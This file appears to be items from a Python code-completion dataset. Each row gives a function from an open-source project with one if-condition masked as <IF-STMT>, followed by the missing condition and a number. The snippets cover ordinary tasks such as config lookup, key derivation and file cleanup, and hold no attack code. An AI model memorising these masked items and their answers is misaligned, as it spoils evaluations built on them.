4220,"def analyze(vw):<tab>for va, dest in vw.findPointers():<tab><tab># Is there a location already at the target?<tab><tab>loc = vw.getLocation(dest)<tab><tab>if loc is None:<tab><tab><tab>continue<tab><tab>if loc[L_LTYPE] != LOC_IMPORT:<tab><tab><tab>continue<tab><tab>offset, bytes = vw.getByteDef(va)<tab><tab>if offset < 2:<tab><tab><tab>continue<tab><tab><IF-STMT>  # call [importloc]<tab><tab><tab># If there's a pointer here, remove it.<tab><tab><tab>if vw.getLocation(va):<tab><tab><tab><tab>vw.delLocation(va)<tab><tab><tab>vw.makeCode(va - 2)","if bytes [ offset - 2 : offset ] == b""\xff\x15"" :",192
4221,"def get(_kwargs):<tab>exception_raised_every_time = True<tab>exception = None<tab>no_match = True<tab>for meter in self.meters:<tab><tab>try:<tab><tab><tab>match = getattr(meter, func)(_kwargs)<tab><tab>except KeyError as e:<tab><tab><tab>exception = e<tab><tab>else:<tab><tab><tab>exception_raised_every_time = False<tab><tab><tab><IF-STMT><tab><tab><tab><tab>selected_meters.append(meter)<tab><tab><tab><tab>no_match = False<tab>if no_match:<tab><tab>raise KeyError(""'No match for {}'"".format(_kwargs))<tab>if exception_raised_every_time and exception is not None:<tab><tab>raise exception",if match :,164
4222,"def derive(self, key_material):<tab>if self._used:<tab><tab>raise AlreadyFinalized<tab>self._used = True<tab>if not isinstance(key_material, bytes):<tab><tab>raise TypeError(""key_material must be bytes."")<tab>output = [b""""]<tab>outlen = 0<tab>counter = 1<tab>while self._length > outlen:<tab><tab>h = hashes.Hash(self._algorithm, self._backend)<tab><tab>h.update(key_material)<tab><tab>h.update(_int_to_u32be(counter))<tab><tab><IF-STMT><tab><tab><tab>h.update(self._sharedinfo)<tab><tab>output.append(h.finalize())<tab><tab>outlen += len(output[-1])<tab><tab>counter += 1<tab>return b"""".join(output)[: self._length]",if self . _sharedinfo is not None :,196
4223,"def test_cat(shape, cat_dim, split, dim):<tab>assert sum(split) == shape[cat_dim]<tab>gaussian = random_gaussian(shape, dim)<tab>parts = []<tab>end = 0<tab>for size in split:<tab><tab>beg, end = end, end + size<tab><tab><IF-STMT><tab><tab><tab>part = gaussian[..., beg:end]<tab><tab>elif cat_dim == -2:<tab><tab><tab>part = gaussian[..., beg:end, :]<tab><tab>elif cat_dim == 1:<tab><tab><tab>part = gaussian[:, beg:end]<tab><tab>else:<tab><tab><tab>raise ValueError<tab><tab>parts.append(part)<tab>actual = Gaussian.cat(parts, cat_dim)<tab>assert_close_gaussian(actual, gaussian)",if cat_dim == - 1 :,186
4224,"def ghci_package_db(self, cabal):<tab>if cabal is not None and cabal != ""cabal"":<tab><tab>package_conf = [<tab><tab><tab>pkg for pkg in os.listdir(cabal) if re.match(r""packages-(.*)\.conf"", pkg)<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>return os.path.join(cabal, package_conf)<tab>return None",if package_conf :,106
4225,"def L_op(self, inputs, outputs, gout):<tab>(x,) = inputs<tab>(gz,) = gout<tab>if x.type in complex_types:<tab><tab>raise NotImplementedError()<tab>if outputs[0].type in discrete_types:<tab><tab><IF-STMT><tab><tab><tab>return [x.zeros_like(dtype=theano.config.floatX)]<tab><tab>else:<tab><tab><tab>return [x.zeros_like()]<tab>return (gz / x,)",if x . type in discrete_types :,115
4226,"def __mro_entries__(self, bases):<tab>if self._name:  # generic version of an ABC or built-in class<tab><tab>return super().__mro_entries__(bases)<tab>if self.__origin__ is Generic:<tab><tab><IF-STMT><tab><tab><tab>return ()<tab><tab>i = bases.index(self)<tab><tab>for b in bases[i + 1 :]:<tab><tab><tab>if isinstance(b, _BaseGenericAlias) and b is not self:<tab><tab><tab><tab>return ()<tab>return (self.__origin__,)",if Protocol in bases :,124
4227,"def getvars(request, excludes):<tab>getvars = request.GET.copy()<tab>excludes = excludes.split("","")<tab>for p in excludes:<tab><tab>if p in getvars:<tab><tab><tab>del getvars[p]<tab><tab><IF-STMT><tab><tab><tab>return ""&%s"" % getvars.urlencode()<tab><tab>else:<tab><tab><tab>return """"",if len ( getvars . keys ( ) ) > 0 :,94
4228,"def check(self):<tab>now = time.time()<tab>for fn in os.listdir(self.basedir):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>absfn = os.path.join(self.basedir, fn)<tab><tab>mtime = os.stat(absfn)[stat.ST_MTIME]<tab><tab>if now - mtime > self.old:<tab><tab><tab>os.remove(absfn)",if fn in self . files :,101
4229,"def run(self):<tab>while 1:<tab><tab>gatekeeper.wait()<tab><tab>results = []<tab><tab>results.append(self.__queue.get())<tab><tab>while len(results) < self.MAX_SONGS_PER_SUBMISSION:<tab><tab><tab># wait a bit to reduce overall request count.<tab><tab><tab>timeout = 0.5 / len(results)<tab><tab><tab>try:<tab><tab><tab><tab>results.append(self.__queue.get(timeout=timeout))<tab><tab><tab>except queue.Empty:<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>for lookup_result in self.__process(results):<tab><tab><tab>self.__idle(self.__progress_cb, lookup_result)<tab><tab><tab>self.__queue.task_done()",if self . __stopped :,185
4230,"def __getitem__(self, item):<tab>if isinstance(item, int):<tab><tab>selected_polygons = [self.polygons[item]]<tab>elif isinstance(item, slice):<tab><tab>selected_polygons = self.polygons[item]<tab>else:<tab><tab># advanced indexing on a single dimension<tab><tab>selected_polygons = []<tab><tab><IF-STMT><tab><tab><tab>item = item.nonzero()<tab><tab><tab>item = item.squeeze(1) if item.numel() > 0 else item<tab><tab><tab>item = item.tolist()<tab><tab>for i in item:<tab><tab><tab>selected_polygons.append(self.polygons[i])<tab>return PolygonList(selected_polygons, size=self.size)","if isinstance ( item , torch . Tensor ) and item . dtype == torch . uint8 :",179
4231,"def gather_files(fileset):<tab>common_type = get_common_filetype(fileset)<tab>files = []<tab>for file in fileset.file:<tab><tab>filename = file.name<tab><tab>if file.is_include_file == True:<tab><tab><tab>filename = {}<tab><tab><tab>filename[file.name] = {""is_include_file"": True}<tab><tab>if file.file_type != common_type:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>filename = {}<tab><tab><tab>filename[file.name] = {""file_type"": file.file_type}<tab><tab>files.append(filename)<tab>return files",if type ( filename ) == str :,158
4232,"def _(node):<tab>for __ in dir(node):<tab><tab>if not __.startswith(""_""):<tab><tab><tab>candidate = getattr(node, __)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if ""\\"" in candidate:<tab><tab><tab><tab><tab>try:<tab><tab><tab><tab><tab><tab>re.compile(candidate)<tab><tab><tab><tab><tab>except:<tab><tab><tab><tab><tab><tab>errMsg = ""smoke test failed at compiling '%s'"" % candidate<tab><tab><tab><tab><tab><tab>logger.error(errMsg)<tab><tab><tab><tab><tab><tab>raise<tab><tab><tab>else:<tab><tab><tab><tab>_(candidate)","if isinstance ( candidate , str ) :",142
4233,"def _handle_children(self, removed, added):<tab># Stop all the removed children.<tab>for obj in removed:<tab><tab>obj.stop()<tab># Process the new objects.<tab>for obj in added:<tab><tab>obj.set(scene=self.scene, parent=self)<tab><tab>if isinstance(obj, ModuleManager):<tab><tab><tab>obj.source = self<tab><tab>elif is_filter(obj):<tab><tab><tab>obj.inputs.append(self)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>obj.start()<tab><tab><tab>except:<tab><tab><tab><tab>exception()",if self . running :,148
4234,"def mean(self):<tab>""""""Compute the mean of the value_field in the window.""""""<tab>if len(self.data) > 0:<tab><tab>datasum = 0<tab><tab>datalen = 0<tab><tab>for dat in self.data:<tab><tab><tab>if ""placeholder"" not in dat[0]:<tab><tab><tab><tab>datasum += dat[1]<tab><tab><tab><tab>datalen += 1<tab><tab><IF-STMT><tab><tab><tab>return datasum / float(datalen)<tab><tab>return None<tab>else:<tab><tab>return None",if datalen > 0 :,132
4235,"def get_master_info(accounts_config, master):<tab>master_info = None<tab>for a in accounts_config[""accounts""]:<tab><tab>if a[""name""] == master:<tab><tab><tab>master_info = a<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>master_info = a<tab><tab><tab>break<tab>if master_info is None:<tab><tab>raise ValueError(""Master account: %s not found in accounts config"" % (master))<tab>return master_info","if a [ ""account_id"" ] == master :",120
4236,"def dataset_collector(dataset_collection_description):<tab>if dataset_collection_description is DEFAULT_DATASET_COLLECTOR_DESCRIPTION:<tab><tab># Use 'is' and 'in' operators, so lets ensure this is<tab><tab># treated like a singleton.<tab><tab>return DEFAULT_DATASET_COLLECTOR<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return DatasetCollector(dataset_collection_description)<tab><tab>else:<tab><tab><tab>return ToolMetadataDatasetCollector(dataset_collection_description)","if dataset_collection_description . discover_via == ""pattern"" :",126
4237,"def _eliminate_deprecated_list_indexing(idx):<tab># ""Basic slicing is initiated if the selection object is a non-array,<tab># non-tuple sequence containing slice objects, [Ellipses, or newaxis<tab># objects]"". Detects this case and canonicalizes to a tuple. This case is<tab># deprecated by NumPy and exists for backward compatibility.<tab>if not isinstance(idx, tuple):<tab><tab>if isinstance(idx, Sequence) and not isinstance(idx, ndarray):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>idx = tuple(idx)<tab><tab><tab>else:<tab><tab><tab><tab>idx = (idx,)<tab><tab>else:<tab><tab><tab>idx = (idx,)<tab>return idx",if _any ( _should_unpack_list_index ( i ) for i in idx ) :,177
4238,"def finalizer():<tab>try:<tab><tab>stdout.flush()<tab><tab>stderr.flush()<tab>finally:<tab><tab>time.sleep(0.001)  # HACK: Sleep 1ms in the main thread to free the GIL.<tab><tab>stdout_pipe.stop_writing()<tab><tab>stderr_pipe.stop_writing()<tab><tab>writer.join(timeout=60)<tab><tab><IF-STMT><tab><tab><tab>raise NailgunStreamWriterError(<tab><tab><tab><tab>""pantsd timed out while waiting for the stdout/err to finish writing to the socket.""<tab><tab><tab>)",if writer . isAlive ( ) :,138
4239,"def __init__(self, env, config, scope_infos, option_tracker):<tab># Sorting ensures that ancestors precede descendants.<tab>scope_infos = sorted(set(list(scope_infos)), key=lambda si: si.scope)<tab>self._parser_by_scope = {}<tab>for scope_info in scope_infos:<tab><tab>scope = scope_info.scope<tab><tab>parent_parser = (<tab><tab><tab>None<tab><tab><tab><IF-STMT><tab><tab><tab>else self._parser_by_scope[enclosing_scope(scope)]<tab><tab>)<tab><tab>self._parser_by_scope[scope] = Parser(<tab><tab><tab>env, config, scope_info, parent_parser, option_tracker=option_tracker<tab><tab>)",if scope == GLOBAL_SCOPE,176
4240,"def _load_start_paths(self) -> None:<tab>""Start the Read-Eval-Print Loop.""<tab>if self._startup_paths:<tab><tab>for path in self._startup_paths:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>with open(path, ""rb"") as f:<tab><tab><tab><tab><tab>code = compile(f.read(), path, ""exec"")<tab><tab><tab><tab><tab>exec(code, self.get_globals(), self.get_locals())<tab><tab><tab>else:<tab><tab><tab><tab>output = self.app.output<tab><tab><tab><tab>output.write(""WARNING | File not found: {}\n\n"".format(path))",if os . path . exists ( path ) :,159
4241,"def validate(leaves):<tab>for leaf in leaves:<tab><tab>if leaf.has_form((""Rule"", ""RuleDelayed""), 2):<tab><tab><tab>pass<tab><tab><IF-STMT><tab><tab><tab>if validate(leaf.leaves) is not True:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return False<tab>return True","elif leaf . has_form ( ""List"" , None ) or leaf . has_form ( ""Association"" , None ) :",97
4242,"def add(self, name, value, package=None):<tab># New data, not previous value<tab>if name not in self._data[package]:<tab><tab>self._data[package][name] = value<tab># There is data already<tab>else:<tab><tab># Only append at the end if we had a list<tab><tab><IF-STMT><tab><tab><tab>if isinstance(value, list):<tab><tab><tab><tab>self._data[package][name].extend(value)<tab><tab><tab>else:<tab><tab><tab><tab>self._data[package][name].append(value)","if isinstance ( self . _data [ package ] [ name ] , list ) :",140
4243,"def edge2str(self, nfrom, nto):<tab>if isinstance(nfrom, ExprCompose):<tab><tab>for i in nfrom.args:<tab><tab><tab>if i[0] == nto:<tab><tab><tab><tab>return ""[%s, %s]"" % (i[1], i[2])<tab>elif isinstance(nfrom, ExprCond):<tab><tab>if nfrom.cond == nto:<tab><tab><tab>return ""?""<tab><tab>elif nfrom.src1 == nto:<tab><tab><tab>return ""True""<tab><tab><IF-STMT><tab><tab><tab>return ""False""<tab>return """"",elif nfrom . src2 == nto :,149
4244,"def _get_config(key):<tab>config = db.session.execute(<tab><tab>Configs.__table__.select().where(Configs.key == key)<tab>).fetchone()<tab>if config and config.value:<tab><tab>value = config.value<tab><tab>if value and value.isdigit():<tab><tab><tab>return int(value)<tab><tab><IF-STMT><tab><tab><tab>if value.lower() == ""true"":<tab><tab><tab><tab>return True<tab><tab><tab>elif value.lower() == ""false"":<tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>return value<tab># Flask-Caching is unable to roundtrip a value of None.<tab># Return an exception so that we can still cache and avoid the db hit<tab>return KeyError","elif value and isinstance ( value , string_types ) :",181
4245,"def from_rows(cls, rows):<tab>subtitles = []<tab>for row in rows:<tab><tab><IF-STMT><tab><tab><tab>subtitles.append(cls.from_row(row))<tab>return subtitles","if row . td . a is not None and row . td . get ( ""class"" , [ ""lazy"" ] ) [ 0 ] != ""empty"" :",75
4246,"def _wx_node(self, parent_node, index, label, with_checkbox):<tab>ct_type = 1 if with_checkbox else 0<tab>if index is not None:<tab><tab># blame wxPython for this ugliness<tab><tab><IF-STMT><tab><tab><tab>return self.InsertItemByIndex(parent_node, index, label, ct_type=ct_type)<tab><tab>else:<tab><tab><tab>return self.InsertItem(parent_node, index, label, ct_type=ct_type)<tab>return self.AppendItem(parent_node, label, ct_type=ct_type)","if isinstance ( index , int ) :",147
4247,"def fetch():<tab>retval = {}<tab>content = retrieve_content(__url__)<tab>if __check__ in content:<tab><tab>for line in content.split(""\n""):<tab><tab><tab>line = line.strip()<tab><tab><tab>if not line or line.startswith(""#"") or ""."" not in line:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>reason = line.split("" # "")[1].split()[0].lower()<tab><tab><tab><tab>if reason == ""scanning"":  # too many false positives<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>retval[line.split("" # "")[0]] = (__info__, __reference__)<tab>return retval","if "" # "" in line :",157
4248,"def _remove_event(self, event):<tab># Find event according to its timestamp.<tab># Index returned should be one behind.<tab>i = bisect.bisect(self._eventq, event)<tab># Having two events with identical timestamp is unlikely but possible.<tab># I am going to move forward and compare timestamp AND object address<tab># to make sure the correct object is found.<tab>while i > 0:<tab><tab>i -= 1<tab><tab>e = self._eventq[i]<tab><tab>if e.timestamp != event.timestamp:<tab><tab><tab>raise exception.EventNotFound(event)<tab><tab><IF-STMT><tab><tab><tab>self._eventq.pop(i)<tab><tab><tab>return<tab>raise exception.EventNotFound(event)",elif id ( e ) == id ( event ) :,177
4249,"def _safe_get_content(self, session, resolve_from):<tab>try:<tab><tab>resp = session.get(resolve_from, timeout=self._timeout)<tab><tab><IF-STMT><tab><tab><tab>return resp.content<tab><tab>raise self.ResolverError(""Error status_code={0}"".format(resp.status_code))<tab>except requests.RequestException:<tab><tab>raise self.ResolverError(""Request error from {0}"".format(resolve_from))",if resp . status_code == requests . codes . ok :,116
4250,"def splitlines(self, sep=None, replace=None):<tab>""Return split lines from any file descriptor""<tab>for fd in self.fd:<tab><tab>fd.seek(0)<tab><tab>for line in fd.readlines():<tab><tab><tab>if replace and sep:<tab><tab><tab><tab>yield line.replace(replace, sep).split(sep)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield line.replace(replace, "" "").split()<tab><tab><tab>else:<tab><tab><tab><tab>yield line.split(sep)",elif replace :,122
4251,"def disable_verity():<tab>""""""Disables dm-verity on the device.""""""<tab>with log.waitfor(""Disabling dm-verity on %s"" % context.device):<tab><tab>root()<tab><tab>with AdbClient() as c:<tab><tab><tab>reply = c.disable_verity()<tab><tab>if ""Verity already disabled"" in reply:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>reboot(wait=True)<tab><tab>elif ""0006closed"" in reply:<tab><tab><tab>return  # Emulator doesnt support Verity?<tab><tab>else:<tab><tab><tab>log.error(""Could not disable verity:\n%s"" % reply)","elif ""Now reboot your device"" in reply :",165
4252,"def _process_property_change(self, msg):<tab>msg = super(Select, self)._process_property_change(msg)<tab>if ""value"" in msg:<tab><tab>if not self.values:<tab><tab><tab>pass<tab><tab>elif msg[""value""] is None:<tab><tab><tab>msg[""value""] = self.values[0]<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>idx = indexOf(msg[""value""], self.unicode_values)<tab><tab><tab>else:<tab><tab><tab><tab>idx = indexOf(msg[""value""], self.labels)<tab><tab><tab>msg[""value""] = self._items[self.labels[idx]]<tab>msg.pop(""options"", None)<tab>return msg","if isIn ( msg [ ""value"" ] , self . unicode_values ) :",180
4253,"def merge(module_name, tree1, tree2):<tab>for child in tree2.node:<tab><tab>if isinstance(child, ast.Function):<tab><tab><tab>replaceFunction(tree1, child.name, child)<tab><tab>elif isinstance(child, ast.Assign):<tab><tab><tab>replaceAssign(tree1, child.nodes[0].name, child)<tab><tab><IF-STMT><tab><tab><tab>replaceClassMethods(tree1, child.name, child)<tab><tab>else:<tab><tab><tab>raise TranslationError(<tab><tab><tab><tab>""Do not know how to merge %s"" % child, child, module_name<tab><tab><tab>)<tab>return tree1","elif isinstance ( child , ast . Class ) :",159
4254,"def handle(d: dict):<tab>for key, value in d.items():<tab><tab><IF-STMT><tab><tab><tab>if ""url"" not in value:<tab><tab><tab><tab>handle(value)<tab><tab><tab>else:<tab><tab><tab><tab>global count<tab><tab><tab><tab>count += 1",if type ( value ) == dict :,72
4255,def __stop_loggers(self):<tab>if self._console_proc:<tab><tab>utils.nuke_subprocess(self._console_proc)<tab><tab>utils.nuke_subprocess(self._followfiles_proc)<tab><tab>self._console_proc = self._followfile_proc = None<tab><tab><IF-STMT><tab><tab><tab>self.job.warning_loggers.discard(self._logfile_warning_stream)<tab><tab>self._logfile_warning_stream.close(),if self . job :,113
4256,"def unicode_metrics(metrics):<tab>for i, metric in enumerate(metrics):<tab><tab>for key, value in metric.items():<tab><tab><tab>if isinstance(value, basestring):<tab><tab><tab><tab>metric[key] = unicode(value, errors=""replace"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value_list = list(value)<tab><tab><tab><tab>for j, value_element in enumerate(value_list):<tab><tab><tab><tab><tab>if isinstance(value_element, basestring):<tab><tab><tab><tab><tab><tab>value_list[j] = unicode(value_element, errors=""replace"")<tab><tab><tab><tab>metric[key] = tuple(value_list)<tab><tab>metrics[i] = metric<tab>return metrics","elif isinstance ( value , tuple ) or isinstance ( value , list ) :",177
4257,"def __getitem__(self, idx):<tab>if isinstance(idx, slice):<tab><tab>start, stop, step = idx.indices(len(self))<tab><tab>return [self._revoked_cert(i) for i in range(start, stop, step)]<tab>else:<tab><tab>idx = operator.index(idx)<tab><tab><IF-STMT><tab><tab><tab>idx += len(self)<tab><tab>if not 0 <= idx < len(self):<tab><tab><tab>raise IndexError<tab><tab>return self._revoked_cert(idx)",if idx < 0 :,125
4258,"def _get_columns_and_column_names(row):<tab>column_names = []<tab>columns = []<tab>duplicate_counter = 1<tab>for i, column_name in enumerate(row):<tab><tab><IF-STMT><tab><tab><tab>column_name = ""column_{}"".format(xl_col_to_name(i))<tab><tab>if column_name in column_names:<tab><tab><tab>column_name = ""{}{}"".format(column_name, duplicate_counter)<tab><tab><tab>duplicate_counter += 1<tab><tab>column_names.append(column_name)<tab><tab>columns.append(<tab><tab><tab>{""name"": column_name, ""friendly_name"": column_name, ""type"": TYPE_STRING}<tab><tab>)<tab>return columns, column_names",if not column_name :,179
4259,"def format(self, format, dumper, attrib, data):<tab>if data:<tab><tab>logger.warn(""Unexpected data in %s object: %r"", attrib[""type""], data)<tab>try:<tab><tab>return ImageGeneratorObjectType.format(self, format, dumper, attrib, data)<tab>except ValueError:<tab><tab><IF-STMT><tab><tab><tab>attrib = attrib.copy()<tab><tab><tab>attrib[""type""] = attrib[""type""][6:]<tab><tab>return dumper.dump_img(IMAGE, attrib, None)","if attrib [ ""type"" ] . startswith ( ""image+"" ) :",124
4260,"def handle_facts_wwn(facts):<tab>disk_shares = []<tab>for key, wwn in facts.iteritems():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>path = key.replace(""wwn_"", """")<tab><tab>disk_shares.append(<tab><tab><tab>{<tab><tab><tab><tab>""serial_number"": normalize_wwn(wwn),<tab><tab><tab><tab>""volume"": ""/dev/mapper/%s"" % path,<tab><tab><tab>}<tab><tab>)<tab>return disk_shares","if not key . startswith ( ""wwn_mpath"" ) :",127
4261,"def _finalize_load(*exc_info):<tab>try:<tab><tab>success_keys = [k for k in data_keys if k not in failed_keys]<tab><tab><IF-STMT><tab><tab><tab>self._holder_ref.put_objects_by_keys(<tab><tab><tab><tab>session_id, success_keys, pin_token=pin_token<tab><tab><tab>)<tab><tab>if exc_info:<tab><tab><tab>raise exc_info[1].with_traceback(exc_info[2]) from None<tab><tab>if failed_keys:<tab><tab><tab>raise StorageFull(<tab><tab><tab><tab>request_size=storage_full_sizes[0],<tab><tab><tab><tab>capacity=storage_full_sizes[1],<tab><tab><tab><tab>affected_keys=list(failed_keys),<tab><tab><tab>)<tab>finally:<tab><tab>shared_bufs[:] = []",if success_keys :,200
4262,"def _get_base64md5(self):<tab>if ""md5"" in self.local_hashes and self.local_hashes[""md5""]:<tab><tab>md5 = self.local_hashes[""md5""]<tab><tab><IF-STMT><tab><tab><tab>md5 = md5.encode(""utf-8"")<tab><tab>return binascii.b2a_base64(md5).decode(""utf-8"").rstrip(""\n"")","if not isinstance ( md5 , bytes ) :",104
4263,"def tag_configure(self, *args, **keys):<tab>trace = False and not g.unitTesting<tab>if trace:<tab><tab>g.trace(args, keys)<tab>if len(args) == 1:<tab><tab>key = args[0]<tab><tab>self.tags[key] = keys<tab><tab>val = keys.get(""foreground"")<tab><tab>underline = keys.get(""underline"")<tab><tab><IF-STMT><tab><tab><tab>self.configDict[key] = val<tab><tab>if underline:<tab><tab><tab>self.configUnderlineDict[key] = True<tab>else:<tab><tab>g.trace(""oops"", args, keys)",if val :,150
4264,"def _findSubpath(self, path, A, B, inside):<tab>print(""finding"", A, B)<tab>sub = None<tab>for i in xrange(0, len(path) * 2):  # iterate twice with wrap around<tab><tab>j = i % len(path)<tab><tab>seg = path[j]<tab><tab>if inside.isInside(seg.midPoint()):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sub = Path(""subp"")<tab><tab><tab>print(""seg"", sub is None, seg)<tab><tab><tab>if sub is not None:<tab><tab><tab><tab>sub.append(seg)<tab><tab><tab>if eq(seg.B, B):<tab><tab><tab><tab>break<tab>print(""found"", sub)<tab>return sub","if eq ( seg . A , A ) :",180
4265,"def indent_block(self, cursor):<tab>""""""Indent block after enter pressed""""""<tab>at_start_of_line = cursor.positionInBlock() == 0<tab>with self._neditor:<tab><tab>cursor.insertBlock()<tab><tab><IF-STMT><tab><tab><tab>indent = self._compute_indent(cursor)<tab><tab><tab>if indent is not None:<tab><tab><tab><tab>cursor.insertText(indent)<tab><tab><tab><tab>return True<tab><tab><tab>return False<tab>self._neditor.ensureCursorVisible()",if not at_start_of_line :,127
4266,def checkpoint():<tab>if checkpoint_asserts:<tab><tab>self.assert_integrity_idxs_take()<tab><tab>if node in self.idxs_memo:<tab><tab><tab>toposort(self.idxs_memo[node])<tab><tab><IF-STMT><tab><tab><tab>for take in self.take_memo[node]:<tab><tab><tab><tab>toposort(take),if node in self . take_memo :,86
4267,"def handle(self, *args, **options):<tab>with advisory_lock(""send-notifications-command"", wait=False) as acquired:<tab><tab><IF-STMT><tab><tab><tab>qs = HistoryChangeNotification.objects.all().order_by(""-id"")<tab><tab><tab>for change_notification in iter_queryset(qs, itersize=100):<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>send_sync_notifications(change_notification.pk)<tab><tab><tab><tab>except HistoryChangeNotification.DoesNotExist:<tab><tab><tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>print(""Other process already running"")",if acquired :,142
4268,"def _parse_version_parts(s):<tab>for part in component_re.split(s):<tab><tab>part = replace(part, part)<tab><tab>if part in ["""", "".""]:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>yield part.zfill(8)  # pad for numeric comparison<tab><tab>else:<tab><tab><tab>yield ""*"" + part<tab>yield ""*final""  # ensure that alpha/beta/candidate are before final","if part [ : 1 ] in ""0123456789"" :",109
4269,"def set_password(user_id):<tab>try:<tab><tab>user = Journalist.query.get(user_id)<tab>except NoResultFound:<tab><tab>abort(404)<tab>password = request.form.get(""password"")<tab>if set_diceware_password(user, password) is not False:<tab><tab><IF-STMT><tab><tab><tab>revoke_token(user, user.last_token)<tab><tab>user.session_nonce += 1<tab><tab>db.session.commit()<tab>return redirect(url_for(""admin.edit_user"", user_id=user_id))",if user . last_token is not None :,147
4270,"def _get_normal_median_depth(normal_counts):<tab>depths = []<tab>with open(normal_counts) as in_handle:<tab><tab>header = None<tab><tab>for line in in_handle:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>header = line.strip().split()<tab><tab><tab>elif header:<tab><tab><tab><tab>n_vals = dict(zip(header, line.strip().split()))<tab><tab><tab><tab>depths.append(int(n_vals[""REF_COUNT""]) + int(n_vals[""ALT_COUNT""]))<tab>return np.median(depths)","if header is None and not line . startswith ( ""@"" ) :",145
4271,"def _gen_langs_in_db(self):<tab>for d in os.listdir(join(self.base_dir, ""db"")):<tab><tab>if d in self._non_lang_db_dirs:<tab><tab><tab>continue<tab><tab>lang_path = join(self.base_dir, ""db"", d, ""lang"")<tab><tab><IF-STMT><tab><tab><tab>log.warn(<tab><tab><tab><tab>""unexpected lang-zone db dir without 'lang' file: ""<tab><tab><tab><tab>""`%s' (skipping)"" % dirname(lang_path)<tab><tab><tab>)<tab><tab><tab>continue<tab><tab>fin = open(lang_path, ""r"")<tab><tab>try:<tab><tab><tab>lang = fin.read().strip()<tab><tab>finally:<tab><tab><tab>fin.close()<tab><tab>yield lang",if not exists ( lang_path ) :,194
4272,"def negate(monad):<tab>sql = monad.getsql()[0]<tab>translator = monad.translator<tab>if translator.dialect == ""Oracle"":<tab><tab>result_sql = [""IS_NULL"", sql]<tab>else:<tab><tab>result_sql = [""EQ"", sql, [""VALUE"", """"]]<tab><tab><IF-STMT><tab><tab><tab>if isinstance(monad, AttrMonad):<tab><tab><tab><tab>result_sql = [""OR"", result_sql, [""IS_NULL"", sql]]<tab><tab><tab>else:<tab><tab><tab><tab>result_sql = [""EQ"", [""COALESCE"", sql, [""VALUE"", """"]], [""VALUE"", """"]]<tab>result = BoolExprMonad(result_sql, nullable=False)<tab>result.aggregated = monad.aggregated<tab>return result",if monad . nullable :,188
4273,"def _model_shorthand(self, args):<tab>accum = []<tab>for arg in args:<tab><tab>if isinstance(arg, Node):<tab><tab><tab>accum.append(arg)<tab><tab>elif isinstance(arg, Query):<tab><tab><tab>accum.append(arg)<tab><tab>elif isinstance(arg, ModelAlias):<tab><tab><tab>accum.extend(arg.get_proxy_fields())<tab><tab><IF-STMT><tab><tab><tab>accum.extend(arg._meta.declared_fields)<tab>return accum","elif isclass ( arg ) and issubclass ( arg , Model ) :",125
4274,"def get_hashes_from_fingerprint_with_reason(event, fingerprint):<tab>default_values = set([""{{ default }}"", ""{{default}}""])<tab>if any(d in fingerprint for d in default_values):<tab><tab>default_hashes = get_hashes_for_event_with_reason(event)<tab><tab>hash_count = len(default_hashes[1])<tab>else:<tab><tab>hash_count = 1<tab>hashes = OrderedDict((bit, []) for bit in fingerprint)<tab>for idx in xrange(hash_count):<tab><tab>for bit in fingerprint:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>hashes[bit].append(default_hashes)<tab><tab><tab>else:<tab><tab><tab><tab>hashes[bit] = bit<tab>return hashes.items()",if bit in default_values :,180
4275,"def default(self, obj):<tab>if hasattr(obj, ""__json__""):<tab><tab>return obj.__json__()<tab>elif isinstance(obj, collections.Iterable):<tab><tab>return list(obj)<tab>elif isinstance(obj, dt.datetime):<tab><tab>return obj.isoformat()<tab>elif hasattr(obj, ""__getitem__"") and hasattr(obj, ""keys""):<tab><tab>return dict(obj)<tab>elif hasattr(obj, ""__dict__""):<tab><tab>return {<tab><tab><tab>member: getattr(obj, member)<tab><tab><tab>for member in dir(obj)<tab><tab><tab><IF-STMT><tab><tab><tab>and not hasattr(getattr(obj, member), ""__call__"")<tab><tab>}<tab>return json.JSONEncoder.default(self, obj)","if not member . startswith ( ""_"" )",172
4276,"def get_http_auth(self, name):<tab>auth = self._config.get(""http-basic.{}"".format(name))<tab>if not auth:<tab><tab>username = self._config.get(""http-basic.{}.username"".format(name))<tab><tab>password = self._config.get(""http-basic.{}.password"".format(name))<tab><tab>if not username and not password:<tab><tab><tab>return None<tab>else:<tab><tab>username, password = auth[""username""], auth.get(""password"")<tab><tab><IF-STMT><tab><tab><tab>password = self.keyring.get_password(name, username)<tab>return {<tab><tab>""username"": username,<tab><tab>""password"": password,<tab>}",if password is None :,166
4277,"def add_libdirs(self, envvar, sep, fatal=False):<tab>v = os.environ.get(envvar)<tab>if not v:<tab><tab>return<tab>for dir in str.split(v, sep):<tab><tab>dir = str.strip(dir)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>dir = os.path.normpath(dir)<tab><tab>if os.path.isdir(dir):<tab><tab><tab>if not dir in self.library_dirs:<tab><tab><tab><tab>self.library_dirs.append(dir)<tab><tab>elif fatal:<tab><tab><tab>fail(""FATAL: bad directory %s in environment variable %s"" % (dir, envvar))",if not dir :,159
